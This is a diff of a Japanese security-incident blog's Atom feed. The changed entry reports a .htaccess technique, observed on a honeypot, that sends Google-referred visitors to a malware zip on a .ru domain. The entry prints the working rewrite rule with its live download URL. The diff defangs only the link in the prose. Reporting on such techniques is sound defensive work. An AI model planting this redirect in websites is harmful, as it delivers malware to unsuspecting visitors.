@@ -4,7 +4,7 @@
   <subtitle><![CDATA[tail -f csirt.log]]></subtitle>
   <link href="/atom.xml" rel="self"/>
   <link href="https://csirt.mrtc0.com/"/>
-  <updated>2016-01-21T16:20:33.880Z</updated>
+  <updated>2016-01-21T16:48:38.400Z</updated>
   <id>https://csirt.mrtc0.com/</id>
   
   <author>
@@ -16,13 +16,13 @@
   
   <entry>
     <title><![CDATA[.htaccessで悪質なサイトへ誘導する手法]]></title>
-    <link href="https://csirt.mrtc0.com/uncategorized/cijogrc2y0000aucmurzqgtvj/"/>
-    <id>https://csirt.mrtc0.com/uncategorized/cijogrc2y0000aucmurzqgtvj/</id>
+    <link href="https://csirt.mrtc0.com/uncategorized/cijoht7f90000kqcmqlh6hd31/"/>
+    <id>https://csirt.mrtc0.com/uncategorized/cijoht7f90000kqcmqlh6hd31/</id>
     <published>2016-01-21T14:45:06.000Z</published>
-    <updated>2016-01-21T16:20:33.880Z</updated>
+    <updated>2016-01-21T16:48:38.400Z</updated>
     <content type="html"><![CDATA[<p>Dionaeaにて.htaccessを使ってマルウェア配布サイトへ誘導する手法を観測しました.  </p>
 <figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="keyword"><span class="common">RewriteEngine</span></span> <span class="literal">on</span> </span><br><span class="line"><span class="keyword"><span class="common">RewriteCond</span></span> <span class="cbracket">%&#123;HTTP_REFERER&#125;</span> ^(.*)google\.(.*) </span><br><span class="line"><span class="keyword"><span class="common">RewriteRule</span></span> .* http://testswork.ru/info.zip<span class="sqbracket"> [L]</span></span><br></pre></td></tr></table></figure>
-<p>Google検索経由でアクセスした場合, <a href="http://testwork.ru/info.zip" target="_blank" rel="external">http://testwork.ru/info.zip</a> へとアクセスさせています.  </p>
+<p>Google検索経由でアクセスした場合, hxxp://testwork.ru/info.zip へとアクセスさせています.  </p>
 <h4 id="testwork-ru"><a href="#testwork-ru" class="headerlink" title="testwork.ru"></a>testwork.ru</h4><h6 id="VirusTotal_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C"><a href="#VirusTotal_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C" class="headerlink" title="VirusTotalでのスキャン結果"></a>VirusTotalでのスキャン結果</h6><ul>
 <li><a href="https://www.virustotal.com/ja/domain/testswork.ru/information/" target="_blank" rel="external">https://www.virustotal.com/ja/domain/testswork.ru/information/</a></li>
 </ul>
